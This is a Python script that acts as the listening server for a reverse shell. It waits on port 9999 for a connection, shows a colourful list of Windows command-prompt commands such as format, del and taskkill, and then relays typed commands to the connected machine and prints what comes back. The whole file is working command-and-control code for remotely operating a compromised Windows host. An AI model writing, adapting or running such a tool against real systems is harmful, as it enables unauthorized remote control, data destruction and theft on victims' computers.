import socket
import os

os.system("cls" if os.name == 'nt' else 'clear')

SERVER_IP = '0.0.0.0'
SERVER_PORT = 9999

class Colors:
    RESET = "\033[0m"
    GREEN = "\033[92m"
    CYAN = "\033[96m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    MAGENTA = "\033[95m"
    BLUE = "\033[94m"

def get_rainbow_colors():
    return [
        Colors.RED, Colors.YELLOW, Colors.GREEN, Colors.CYAN,
        Colors.BLUE, Colors.MAGENTA
    ]

def print_rainbow_list():
    commands = [
        "`dir` - Lists files and directories in the current directory.",
        "`cd` - Changes the current directory.",
        "`md` - Creates a new directory.",
        "`rd` - Removes (deletes) a directory.",
        "`copy` - Copies files.",
        "`del` - Deletes files.",
        "`ren` - Renames files.",
        "`type` - Displays the content of a text file.",
        "`edit` - Opens a simple text editor.",
        "`format` - Formats a disk or a diskette.",
        "`chkdsk` - Checks a disk for errors.",
        "`tree` - Displays a graphical representation of the directory structure.",
        "`attrib` - Displays or changes file attributes.",
        "`ping` - Sends ICMP Echo Request packets to test network connectivity.",
        "`ipconfig` - Displays IP configuration information.",
        "`net` - Manages network resources.",
        "`mode` - Configures system devices.",
        "`date` - Displays or sets the system date.",
        "`time` - Displays or sets the system time.",
        "`set` - Displays, sets, or removes environment variables.",
        "`tasklist` - Displays a list of currently running tasks.",
        "`taskkill` - Terminates one or more running tasks.",
        "`fc` - Compares two files or sets of files.",
        "`help` - Displays help information for commands.",
        "`exit` - Exits the Command Prompt.",
        ' '
    ]

    colors = get_rainbow_colors()
    for index, command in enumerate(commands):
        print(f"{colors[index % len(colors)]}{command}{Colors.RESET}")

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((SERVER_IP, SERVER_PORT))
    server_socket.listen(1)
    print(f"{Colors.CYAN}[*] Listening on {SERVER_IP}:{SERVER_PORT}{Colors.RESET}")

    client_socket, client_address = server_socket.accept()
    print(f"{Colors.GREEN}[*] Connection from {client_address}{Colors.RESET}")
    
    print_rainbow_list()

    while True:
        command = input(f"{Colors.CYAN}Shell{Colors.RESET} --> ")

        if command.lower() == 'exit':
            client_socket.sendall(command.encode('utf-8'))
            break

        client_socket.sendall(command.encode('utf-8'))

        response = client_socket.recv(4096).decode('utf-8')
        print(response)

    client_socket.close()
    server_socket.close()

if __name__ == "__main__":
    start_server()
